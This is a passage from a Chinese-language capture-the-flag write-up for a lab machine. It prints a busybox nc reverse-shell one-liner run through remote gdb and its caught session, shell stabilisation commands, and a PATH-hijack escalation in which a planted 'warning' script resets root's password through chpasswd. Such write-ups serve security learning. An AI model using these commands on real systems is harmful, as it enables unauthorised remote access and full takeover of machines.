+Starting program:  sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|/bin/busybox nc 192.168.205.128 8888 >/tmp/p'
+Reading /bin/busybox from remote target...
+⚠️ warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
+Reading /bin/busybox from remote target...
+Reading symbols from target:/bin/busybox...
+(No debugging symbols found in target:/bin/busybox)
+Reading /lib/ld-musl-x86_64.so.1 from remote target...
+Reading /lib/ld-musl-x86_64.so.1 from remote target...
+Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
+Reading /usr/lib/debug/lib/ld-musl-x86_64.so.1.debug from remote target...
+[Detaching after fork from child process 2533]
+[Detaching after fork from child process 2534]
+[Detaching after fork from child process 2535]
+[Detaching after fork from child process 2536]
+[Detaching after fork from child process 2537]
+```
+
+写了个脚本自动跑 gdb 配置，指定远程执行 `/bin/busybox` 并传入反弹 shell 的命令。执行后 gdb 成功附加上去并 fork 了子进程。
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 42107
+/bin/sh: can't access tty; job control turned off
+~ $ id
+uid=1000(514) gid=1000(514) groups=1000(514)
+```
+
+切回监听窗口，shell 已经稳稳接到了，当前用户是 514。
+
+# 环境稳定与提权信息收集
+
+到手的是个残废 shell，老规矩先做交互式处理。
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/ash")'
+Ctrl+Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=/bin/ash
+stty rows 36 columns 178
+```
+
+这里特意把 SHELL 设成了 /bin/ash 适配 Alpine。接着跑了个枚举脚本省事，搜集一波系统信息。
+
+![image-20260304142209164](http://7r1UMPHK.github.io/image/20260304211636980.webp)
+
+脚本结果显示 `/usr/local/bin` 目录我们当前用户有写入权限。其实在前面打 web 测试任意文件读取时，我通过读 `/proc` 下的文件已经察觉到这台机器上有个定时任务一直在跑，结合这里的写入权限，思路一下子就通了。
+
+顺着定时任务往下查，找到了它调用的本体脚本。
+
+![image-20260304142531974](http://7r1UMPHK.github.io/image/20260304211637910.webp)
+
+看下这个 `/usr/bin/monitor` 的权限和内容。
+
+```bash
+~ $ ls -al /usr/bin/monitor
+-rwxr-xr-x    1 root     root           141 Jan 24 01:33 /usr/bin/monitor
+~ $ cat /usr/bin/monitor
+#!/bin/sh
+i=1
+while [ $i -le 3 ]; do
+    if [ ! -f /home/514/protected/secret ]; then
+        warning
+    fi
+    sleep 2
+    i=$((i+1))
+done
+~ $ cat /home/514/protected/secret
+thisissupersecret!
+```
+
+这个 root 权限运行的 monitor 脚本逻辑很简单：每隔几秒检查 `secret` 文件存不存在，如果不存在，就执行 `warning`。我去读了一下 `secret`，里面的内容不是密码，纯粹是个干扰项。
+
+# PATH 劫持提权
+
+这里就是破局点了。脚本里调用 `warning` 的时候并没有写绝对路径（比如 `/usr/bin/warning`），这就意味着系统会去查 PATH 环境变量。而我们刚好对通常在 PATH 极前面的 `/usr/local/bin` 有写入权限，这就是明摆着的 PATH 劫持。
+
+只要把 `secret` 文件干掉触发 `warning`，再在 `/usr/local/bin` 写个恶意的 `warning` 脚本，就能以 root 权限执行任意命令。
+
+```bash
+/tmp $ rm -rf /home/514/protected/secret
+rm: can't remove '/home/514/protected/secret': Permission denied
+/tmp $ mv /home/514/protected/ /home/514/1
+/tmp $ echo 'echo "root:root123" | chpasswd' > /usr/local/bin/warning;chmod +x /usr/local/bin/warning
+/tmp $ cat /usr/local/bin/warning
+echo "root:root123" | chpasswd
+/tmp $ su -
+Password: 
+Koishi:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+Koishi:~# cat /root/root.txt /home/514/user.txt 
+flag{root-7bd5942949d04a7abfa7b9af22704ae2}
+flag{user-dab89930872234e42142674ea25869dc}
+```
